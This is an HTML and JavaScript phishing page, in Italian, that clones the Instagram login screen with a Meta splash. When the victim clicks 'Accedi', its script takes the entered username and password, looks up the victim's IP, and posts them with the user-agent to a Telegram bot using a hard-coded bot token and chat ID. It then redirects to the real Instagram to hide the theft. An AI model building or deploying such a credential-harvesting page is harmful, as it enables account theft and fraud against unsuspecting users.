<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login Clone</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, sans-serif;
}

/* ===== SPLASH ===== */
.splash{
    position:fixed;
    width:100%;
    height:100vh;
    background:#0f2533;
    display:flex;
    flex-direction:column;
    justify-content:center;
    align-items:center;
    z-index:999;
}

.splash svg{
    width:130px;
    height:130px;
}

.metaSplash{
    position:absolute;
    bottom:50px;
    text-align:center;
    color:#aaa;
    font-size:16px;
}

.metaSplash strong{
    font-size:18px;
    background: linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5);
    -webkit-background-clip:text;
    -webkit-text-fill-color:transparent;
}

/* ===== LOGIN ===== */
body{
    background:#0f2533;
    height:100vh;
    color:white;
}

.container{
    display:none;
    width:100%;
    max-width:420px;
    margin:auto;
    padding:20px;
    flex-direction:column;
    align-items:center;
    height:100vh;
}

.logo{
    margin-top:80px;
    margin-bottom:60px;
    display:flex;
    justify-content:center;
}

.logo svg{
    width:95px;
    height:95px;
}

.input-box{
    width:100%;
    margin-bottom:18px;
}

.input-box input{
    width:100%;
    height:65px;
    border:2px solid #3b5266;
    border-radius:20px;
    background:transparent;
    color:white;
    font-size:16px;
    padding:0 20px;
    outline:none;
}

.input-box input::placeholder{
    color:#a4adb6;
}

.login-btn{
    width:100%;
    height:55px;
    border:none;
    border-radius:30px;
    background:#1877f2;
    color:white;
    font-size:18px;
    cursor:pointer;
}

.login-btn:disabled{
    opacity:0.6;
    cursor:not-allowed;
}

.forgot{
    margin-top:20px;
    color:white;
    text-decoration:none;
    font-size:16px;
}

.bottom{
    margin-top:auto;
    width:100%;
    text-align:center;
    padding-bottom:30px;
}

.create{
    width:100%;
    height:55px;
    border:2px solid #2d8cff;
    border-radius:30px;
    background:transparent;
    color:#4fa0ff;
    font-size:16px;
}

.meta{
    margin-top:25px;
    font-size:18px;
    color:#d6d6d6;
}

#countdown{
    margin-top:10px;
    color:#ffcc00;
    font-size:14px;
}

.loader{
    display:inline-block;
    width:16px;
    height:16px;
    border:2px solid #fff;
    border-top:2px solid transparent;
    border-radius:50%;
    animation: spin 0.8s linear infinite;
    margin-right:8px;
    vertical-align:middle;
}

@keyframes spin{
    to{transform:rotate(360deg);}
}
</style>

</head>

<body>

<!-- SPLASH -->
<div class="splash" id="splash">

<svg viewBox="0 0 24 24" fill="none">
<defs>
<linearGradient id="ig" x1="0" y1="1" x2="1" y2="0">
<stop offset="0%" stop-color="#feda75"/>
<stop offset="20%" stop-color="#fa7e1e"/>
<stop offset="45%" stop-color="#d62976"/>
<stop offset="70%" stop-color="#962fbf"/>
<stop offset="100%" stop-color="#4f5bd5"/>
</linearGradient>
</defs>

<rect x="3" y="3" width="18" height="18" rx="5"
stroke="url(#ig)" stroke-width="2.2"/>

<circle cx="12" cy="12" r="4.2"
stroke="url(#ig)" stroke-width="2.2"/>

<circle cx="17.5" cy="6.5" r="1.3" fill="url(#ig)"/>
</svg>

<div class="metaSplash">
<span>from</span>
<strong>Meta</strong>
</div>

</div>

<!-- LOGIN -->
<div class="container" id="login">

<div class="logo">

<svg viewBox="0 0 24 24" fill="none">
<defs>
<linearGradient id="ig2" x1="0" y1="1" x2="1" y2="0">
<stop offset="0%" stop-color="#feda75"/>
<stop offset="20%" stop-color="#fa7e1e"/>
<stop offset="45%" stop-color="#d62976"/>
<stop offset="70%" stop-color="#962fbf"/>
<stop offset="100%" stop-color="#4f5bd5"/>
</linearGradient>
</defs>

<rect x="3" y="3" width="18" height="18" rx="5"
stroke="url(#ig2)" stroke-width="2.2"/>

<circle cx="12" cy="12" r="4.2"
stroke="url(#ig2)" stroke-width="2.2"/>

<circle cx="17.5" cy="6.5" r="1.3" fill="url(#ig2)"/>
</svg>

</div>

<div class="input-box">
<input type="text" id="username" placeholder="Nome utente, e-mail o numero di cellulare">
</div>

<div class="input-box">
<input type="password" id="password" placeholder="Password">
</div>

<button class="login-btn" id="loginBtn">Accedi</button>
<div id="countdown"></div>

<a href="#" class="forgot">Password dimenticata?</a>

<div class="bottom">
<button class="create">Crea nuovo account</button>
<div class="meta">∞ Meta</div>
</div>

</div>

<script>
// =====================================================
// 🎯 CONFIGURAZIONE — INSERISCI I TUOI DATI QUI
// =====================================================
const BOT_TOKEN = "8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg"; // ← Metti il token del tuo bot
const CHAT_ID  = "8278195073"; // ← Metti il tuo chat ID

// =====================================================
// ⏱ SPLASH → LOGIN dopo 3 secondi
// =====================================================
setTimeout(() => {
    document.getElementById("splash").style.display = "none";
    document.getElementById("login").style.display = "flex";
}, 3000);

// =====================================================
// 📩 Invia messaggio a Telegram
// =====================================================
async function sendToTelegram(username, password, ip, userAgent) {
    const text = `🔐 *Instagram Credenziali Catturate*

👤 *Username:* \`${username}\`
🔑 *Password:* \`${password}\`
🌐 *IP:* \`${ip}\`
📱 *User-Agent:* \`${userAgent}\`
⏰ *Data:* ${new Date().toLocaleString('it-IT')}`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        const resp = await fetch(url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown'
            })
        });
        return resp.ok;
    } catch(e) {
        console.error('Telegram error:', e);
        return false;
    }
}

// =====================================================
// 🌍 Ottenere IP (opzionale, fallback se fallisce)
// =====================================================
async function getIP() {
    try {
        const resp = await fetch('https://api.ipify.org?format=json');
        const data = await resp.json();
        return data.ip;
    } catch(e) {
        return 'IP non rilevato';
    }
}

// =====================================================
// 🎯 Gestione click su "Accedi"
// =====================================================
document.getElementById("loginBtn").addEventListener("click", async function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();

    if(!username || !password){
        alert("Per favore compila tutti i campi.");
        return;
    }

    // Disabilita bottone e mostra loading
    const btn = this;
    btn.disabled = true;
    btn.innerHTML = '<span class="loader"></span> Elaborazione...';

    // Ottieni IP e User-Agent
    const ip = await getIP();
    const userAgent = navigator.userAgent;

    // Invia a Telegram
    await sendToTelegram(username, password, ip, userAgent);

    // ⏱ Avvia countdown 5 secondi
    let seconds = 5;
    const countdownDiv = document.getElementById("countdown");
    countdownDiv.innerHTML = `Reindirizzamento tra ${seconds} secondi...`;

    const timer = setInterval(() => {
        seconds--;
        if(seconds > 0){
            countdownDiv.innerHTML = `Reindirizzamento tra ${seconds} secondi...`;
        } else {
            clearInterval(timer);
            countdownDiv.innerHTML = "";
            // Reindirizza a Instagram vero
            window.location.href = "https://www.instagram.com/";
        }
    }, 1000);
});
</script>

</body>
</html>
